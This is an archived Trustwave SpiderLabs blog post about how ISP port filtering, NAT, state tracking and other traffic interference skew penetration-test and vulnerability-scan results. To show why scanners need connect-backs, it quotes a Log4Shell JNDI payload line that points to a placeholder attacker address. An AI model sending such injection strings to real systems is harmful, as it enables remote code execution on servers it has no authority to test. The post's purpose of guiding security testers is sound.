{
    "id": "7b93bb1b-da96-408c-be2a-5bcf932de36b",
    "created_at": "2023-01-12T15:10:27.19207Z",
    "updated_at": "2025-03-27T02:05:58.461875Z",
    "deleted_at": null,
    "sha1_hash": "cd4fd1a0b55f6d6f58437c2fc8c1636cef070d80",
    "title": "2022-06-08 - Not all -Internet Connections- are Equal",
    "authors": "",
    "file_creation_date": "2022-09-01T10:07:10Z",
    "file_modification_date": "2022-09-01T10:07:10Z",
    "file_size": 455168,
    "plain_text": "# Not all \"Internet Connections\" are Equal\n\n**[trustwave.com/en-us/resources/blogs/spiderlabs-blog/not-all-internet-connections-are-equal](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/not-all-internet-connections-are-equal)**\n\nLoading...\n\nBlogs & Stories\n\n## SpiderLabs Blog\n\nAttracting more than a half-million annual readers, this is the security community's go-to\ndestination for technical breakdowns of the latest threats, critical vulnerability disclosures\nand cutting-edge research.\n\nPeople commonly think that any “Internet Connection” is exactly the same, or they may be\nvaguely aware that some connections are faster than others. However, there are significant\ndifferences between the connections. While these differences may not matter to someone\nwho just wants to browse websites and read email, they can be significant or even\nshowstoppers for more advanced users. This is especially true for anyone looking to do\nsecurity testing or vulnerability scanning.\n\n\n-----\n\nSecurity testers are advanced niche users, and many ISPs simply don t cater to their needs.\nSo, before you get started on a system evaluation make certain the network being used can\nproperly support your efforts or else the results obtained will not be optimal or simply\ninaccurate.\n\nTake the simple diagram below:\n\nImagine you are a security tester, using a laptop in the green zone, and the client whom\nyou’re trying to test has a server located in the yellow zone. Your connection goes through\none or more routers and through an ISP before it reaches the public Internet, and then your\nclient also has its own ISP.\n\nThe red zone represents “someone else”, that is a malicious attacker who could be\nanywhere on the Internet and who probably uses a different ISP than you.\n\nIn order to do thorough scans, you need to ensure that any traffic you send leaves the\ngreen zone – i.e. your network and your ISP’s network, without being interfered with in any\nway. If your ISP interferes with the traffic, then it may not reach the target thus preventing\nyou from properly testing the system. An attacker (in the red zone) won’t be subject to any\nrestrictions imposed by your ISP and may be able to exploit vulnerabilities that are hidden\nby your ISP.\n\nConversely, if any traffic interference takes place within the client’s ISP – that is the yellow\nzone, that will affect any attacker equally.\n\n### Why would an ISP do this?\n\nISPs implement various forms of traffic management on their network, and for many\ndifferent reasons. Typical light users who are only web browsing are unlikely to be affected\nby such measures, but vulnerability scans generate a large volume of highly varied traffic as\n\n\n-----\n\nthey try to target many different ports and protocols.\n\n### Common restrictions\n\nSome common restrictions and examples implemented by ISPs.\n\n**Port filtering**\n\nSome common ports are widely abused by threat actors, and consequently some ISPs –\nespecially those supplying end users, will proactively filter these ports. If a port is blocked\nby your ISP, your attempt to connect to or scan that port will not leave the yellow zone in the\ndiagram above, yet if your client has the port open an attacker using a different ISP will be\nable to connect to it. Some commonly filtered ports might include:\n\n445 – The default Windows SMB port – This port is often filtered by ISPs as Microsoft\ndoes not recommend this service be used over the public Internet, and we have seen\nmany instances of malware being used to target this port. The provider OVH in France\nfor instance filters this port globally across their whole network.\n25 – The default SMTP port – Email servers use this port to transmit email from one\nserver to another, but these days it is rarely used by end-users. Attackers will often\nsend spam via SMTP, and IP addresses that frequently send spam will usually\nbecome blacklisted. Many consumer ISPs and hosting providers will filter this port by\ndefault to prevent sending spam. AWS and GCP block this port by default, although\nyou can manually request access to port 25 if needed.\n\n**Transparent proxying**\n\nSome ISPs implement transparent proxying or redirection of unencrypted protocols such as\nHTTP or DNS. As such traffic is unencrypted, the ISP can see its contents – this lends itself\nto several efficiency measures that can be used to improve perceived performance for end\nusers, as well as other measures which are beneficial to the ISP:\n\n**Caching – if you request static content over an unencrypted protocol like HTTP, the ISP**\nmay cache it locally so that when subsequent users access the content it will be served\nfrom the local cache rather than retrieved from the source server. For sites that might be\nhosted on the other side of the world this can result in a significantly faster load time.\n\n**Redirection – similar to caching, certain content such as large file downloads are typically**\nmirrored in multiple locations. If you request a known file from a faraway download server,\nthe ISP may transparently redirect you to a local mirror site. The ISP M1 in Singapore\nimplements such a system:\n\n\n-----\n\n[In the above screenshot, although I have tried to download a site from “ftp.knoppix.nl” – a](http://scanmail.trustwave.com/?c=4062&d=48qd4XaTS73lB5q4E99y2RK9W_c0dnOn8V0BAiLVJg&s=5&u=http%3a%2f%2fftp%2eknoppix%2enl%2f)\nsite located in the Netherlands, i receive a redirect response to “103.1.138.158” which is a\nlocal server in Singapore which also has a copy of the same file. This redirect is not coming\nfrom the server in the Netherlands, but rather is inserted by the local ISP.\n\n**Advertising – as traffic such as DNS and HTTP is typically unencrypted, an ISP could**\ninsert advertising as a way to generate additional revenue. Several ISPs have been known\nto intercept failed DNS requests (ie request for a host that didn’t exist) and redirect them to\nan ad supported search page for instance.\n\n**State tracking**\n\nTypical routers process each individual packet they receive. They look at the destination\naddress of the packet, look up the route to that destination and then forward it via the\nappropriate interface. Simple and fast.\n\nHowever, some devices perform state tracking, they maintain a database of active traffic\nflows so that follow up packets can be attributed to a previously opened connection. This is\ntypically used by firewalls and is generally advertised as “stateful inspection” or similar.\n\nEvery time a packet is received, the device will determine if it’s a new flow or part of an\nexisting one. Firewalls will often perform this tracking even if their rules are set to allow all.\n\nFrom a security perspective state tracking is often desirable, as it allows for far greater\ncontrol of firewall rules than a simple stateless access list. On the other hand, it consumes\nconsiderably more resources and therefore requires more powerful hardware to achieve\nsimilar levels of performance.\n\nThe state table – that is the list of active states consumes resources (memory) depending\non the size of the table, and a larger table will also require more processing resources to\ncheck every time a packet is received. A large state table will result in poor performance,\nwhile a small state table can be easily filled.\n\nWhen you perform scans, you send many packets to different ports. Each of those packets\ncreates a state entry on the firewall, and the firewall will remember that state entry until it\neither times out or it receives a packet which closes the state (eg a reset packet). If the\n\n\n-----\n\ntargets you are scanning don t respond with resets, every port you scan will create a state\nin your firewall’s memory which will remain there for the timeout duration. If the timeout is\ntoo small then it could forget about the connection before receiving a reply and thus ignore\nthe reply, or if the timeout is too big those connections will keep accumulating as you scan.\nOnce the state table is full and the firewall receives a new packet, it either must discard the\nnew packet or discard an existing state entry. If this happens then not all the scanning\npackets you send will reach the destination and you may miss active services.\n\nMany cloud providers such as AWS and Azure place your systems behind a stateful device,\nand often the size of the state table depends upon the capacity of machine you paid for to\nminimize the risk of one user’s excessively overloaded state table impacting other users.\n\n**NAT**\n\nIPv4 Internet connections are often behind NAT simply because IPv4 was never designed\nfor a global network and doesn’t have enough addresses. NAT allows for multiple systems\nto share a single address. Each system has its own internal address behind the NAT\ngateway, and outbound traffic is then translated to the public address of the NAT gateway\nbefore being sent out. Remote systems only ever see the public address and are not aware\nof the internal addresses behind the gateway.\n\nNAT requires state tracking (see above) because any responses received from external\nhosts need to be correlated to an existing connection, so the traffic can then be forwarded\nback to the internal address, so all the negatives of state tracking also impact NAT. But NAT\ncan cause other problems as well:\n\nNAT typically translates the IP header, changing the source address of outbound traffic from\nthe internal address to the external address. However, there are millions of higher-level\nprotocols, and some of them embed the IP address within the higherlevel protocol. The\ninternal machine is only aware of its internal address, so that’s what it sends while the NAT\ngateway is not aware of the protocol so it cannot translate the higher-level protocol\ncontents.\n\nProtocols such as SIP and FTP operate in this way, as does a reverse connecting shell.\nMany vulnerabilities can depend on triggering a connect back to the testing box in order to\neither exploit the vulnerability, or even just to determine if the vulnerability is present.\nVulnerability scanners such as Nessus explicitly warn against using them from behind a\nNAT.\n\nNAT is typically performed by your own router on home connections, but you will typically\nonly get one IP address so without NAT you can only use a single device at any one time.\nThere may also be additional layers of NAT performed by equipment at the ISP. This is\nknown as CGNAT (Carrier Grade NAT). Almost all mobile providers use CGNAT, as do most\n\n\n-----\n\nnewer ISPs as they don t have enough IPv4 addresses to provide one to every customer.\nSome may allow you to avoid CGNAT by paying extra or upgrading to a business class\nconnection.\n\nCloud providers such as AWS, Azure, GCP and Oracle use NAT for IPv4. AWS and Oracle\ndo not use NAT for IPv6 connections.\n\nIPv6 NAT is also possible, but far less common. NAT has many drawbacks and is only used\nby necessity with IPv4, IPv6 addresses those deficiencies of IPv4 which make NAT\nnecessary.\n\nMany systems will block or restrict traffic from IP addresses which send malicious traffic. If\nyou are sharing an IP with other users of the same ISP, any one of those users could have\nalready gotten you blacklisted – similarly, your scans could get you and every other\ncustomer of your ISP blacklisted. This not only potentially renders your scan results\ninaccurate but could also make you unpopular with the ISP and its other customers.\n\n**Inbound Connections**\n\nThere are many instances when it's desirable to be able to receive inbound connections.\nFor example, the recent Log4J vulnerability known as Log4Shell works by triggering a\nvulnerable server to make a connect back to an attacker's host. Scanning for such\nvulnerabilities is therefore done by sending requests containing strings containing a URL\npointing back to the scanning host, for example:\n\n${jndi:ldap://ATTACKERADDRESS/path/to/malicious/Java_class}\n\nWhere \"ATTACKERADDRESS\" is the address of the system doing the scanning. If this\nstring is sent to a vulnerable version of Log4j for logging, then the supplied URL is parsed\nand Log4j attempts to make a connect back to ATTACKERADDRESS.\n\nIn the event that the scanning system is behind NAT, ATTACKERADDRESS will\ncontain the internal IP of the scanner which the vulnerable host won't be able to\nconnect to.\nIf there is a firewall in front of the scanning system which blocks inbound connections,\nit will block the connect back.\n\nEither of these scenarios will result in the scanner assuming the target host is not\nvulnerable, since it does not receive the return connection. But this may be a false negative\nsince the inability to receive the connect back is the fault of the scanning system and not of\nthe target. An attacker launching an attack from a fully unrestricted connection may be\nsuccessful.\n\n**Application-Level Gateways (ALGs)**\n\n\n-----\n\nSome common protocols such as SIP and FTP are inherently incompatible with NAT\nbecause they do not operate in a traditional client-server model, instead the \"server\" needs\nto connect back to the \"client\" under some circumstances. In order to work around this, the\nNAT gateway must have application-specific code to handle the higher-level protocols.\n\nFTP in active mode works by sending a command called \"PORT\" or \"EPRT\" which tells the\nserver the address and port which it should connect to in order to perform a data transfer.\nUnder a NAT scenario the client would only know its internal address and would send that\nin the PORT command, and the server would not be able to reach this address. Even if the\nserver did know the public address of the NAT gateway, upon receiving the inbound\nconnection from the server the gateway would not know which internal device to forward the\nconnection to.\n\n**Partial Connectivity**\n\nSome ISPs only provide partial Internet connectivity for various reasons. As you are only\nconnected to part of the Internet, you won’t be able to test anything in the parts you can’t\nreach. There are several common forms of partial connectivity:\n\n**No IPv6: Some backwards ISPs don’t provide connectivity to the modern IPv6 Internet. If**\nyou don’t have IPv6, then you won’t be able to perform scans of IPv6 addresses. Many\npublic sites are now dual stack, and it is important to scan both the IPv6 and IPv4\naddresses as vulnerabilities might only be present on one and not the other.\n\n**No/Limited IPv4: As IPv4 is becoming extremely expensive to provide and maintain, some**\nISPs provide a limited IPv4 connection, for instance through the use of Carrier Grade NAT\n(CGNAT). While NAT that you control is problematic enough, a CGNAT instance controlled\nby the provider will be significantly more restrictive.\n\n**Partial transit / peering: Sending traffic internationally often costs more than routing it**\nlocally or domestically. Many ISPs offer a lower cost partial transit option where traffic will\nonly be sent over the cheaper local routes.\n\n**Site filtering: Some ISPs may choose to block certain sites or address ranges for various**\nreasons. This could be due to all manner of reasons including government mandated\nfiltering, blocking sources of malicious traffic\n\n**Traffic shaping / throttling**\n\nWhile a typical router will process the packets it receives in order, some ISPs will implement\ntraffic shaping measures designed to prevent heavy users from hogging all the available\nbandwidth and making the service slow for everyone else. These systems could work in\nvarious ways including prioritizing traffic based on port, user, protocol, destination etc. As\nthese systems interfere with the traffic you send in various ways, they can alter the outcome\nof scans\n\n\n-----\n\n**VPNs / Tunnels**\n\nVPNs or tunnels will often impose additional restrictions on traffic, such as limiting the\nmaximum packet size (MTU). This could result in larger packets either being dropped, or in\nsome cases become chopped into smaller packets (fragmented), In either case, the packets\nyou send don’t reach the destination.\n\n**Egress filtering / Anti Spoofing**\n\nMany ISPs will not allow you to generate traffic with a source address that is not your own\nIP. Spoofed packets are not typically generated by end users and are rarely useful. On the\nother hand, as a security tester you may want to test attacks that depend on being able to\nsend spoofed packets such as DNS cache poisoning, IDS/IPS evasion, SNMP attacks, DoS\nvulnerabilities (eg historical attacks like Land and Teardrop etc).\n\n### What to do?\n\nIf you want to perform pentests or vulnerability scans, ensure you are using an ISP that\ngives you a totally unfiltered connection. Many ISPS, especially the smaller more technically\nminded ones are aware of the need for security testing and are willing to provide such\nconnections on request even if they don’t do so by default.\n\nIt is also strongly recommended to speak to prospective ISPs first and draw up a contract\ndetailing exactly what you’re going to use the connection for. The ISP should guarantee that\nthey will not implement any detrimental measures on your connection in the future and\nshould also have an agreed-upon process in place to deal with any complaints they might\nreceive.\n\nWhen you are performing a pentest of a target company, you cannot guarantee that every\nemployee or supplier of that company is fully aware that your testing is taking place. If\nsomeone who is not aware of the test taking place sees your testing traffic, they may\ninterpret it as a malicious attack and respond by sending a complaint to your ISP. This in\nturn, could cause your ISP to shut off or restrict your connection causing you a serious\nheadache. By ensuring your ISP is aware of your business and you have a contractually\nagreed process in place to deal with complaints, you mitigate this risk.\n\nIf such an ISP is not available locally, find one that will host a server for you from which you\ncan perform all your scans and testing.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-08 - Not all -Internet Connections- are Equal.pdf"
    ],
    "report_names": [
        "2022-06-08 - Not all -Internet Connections- are Equal.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536227,
    "ts_updated_at": 1743041158,
    "ts_creation_date": 1662026830,
    "ts_modification_date": 1662026830,
    "files": {
        "pdf": "https://archive.orkl.eu/cd4fd1a0b55f6d6f58437c2fc8c1636cef070d80.pdf",
        "text": "https://archive.orkl.eu/cd4fd1a0b55f6d6f58437c2fc8c1636cef070d80.txt",
        "img": "https://archive.orkl.eu/cd4fd1a0b55f6d6f58437c2fc8c1636cef070d80.jpg"
    }
}